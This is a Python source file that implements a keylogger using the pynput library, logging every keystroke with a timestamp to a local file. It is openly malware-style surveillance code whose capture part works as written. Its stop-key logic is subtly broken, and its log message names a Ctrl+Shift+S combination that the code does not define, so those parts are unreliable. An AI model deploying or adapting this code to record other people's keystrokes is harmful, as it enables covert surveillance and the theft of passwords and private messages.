import time
import logging
from pynput import keyboard

class Keylogger:
    def __init__(self, log_file="keylog.txt", stop_key=(keyboard.Key.shift, keyboard.KeyCode.from_char('s'))):
        self.log_file = log_file
        self.stop_key = stop_key  # Key combination to stop the keylogger
        self.listener = None

    def on_key_press(self, key):
        try:
            with open(self.log_file, "a") as log_file:
                log_file.write(f"{time.time()} - {key}\n")
                log_file.flush()  # Flush the buffer to ensure immediate writing
        except Exception as e:
            logging.error(f"Error: {e}")

        # Check if the pressed key combination is the stop key
        if isinstance(key, keyboard.KeyCode) and (key.char == self.stop_key[1].char):
            if all([getattr(self.stop_key[0], attr) for attr in dir(self.stop_key[0]) if not callable(getattr(self.stop_key[0], attr))]):
                if key == self.stop_key[1]:
                    self.stop_logging()
                    return False  # Stop the listener

    def start_logging(self):
        logging.basicConfig(filename='keylogger.log', level=logging.DEBUG)
        logging.info("Keylogger started. Press Ctrl+Shift+S to stop logging.")

        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            logging.info("Keylogger stopped. Log saved to: %s", self.log_file)
        else:
            logging.warning("Keylogger is not running.")

def main():
    keylogger = Keylogger()
    keylogger.start_logging()

    try:
        # Keep the main thread running to detect the stop key combination
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        keylogger.stop_logging()

if __name__ == "__main__":
    main()
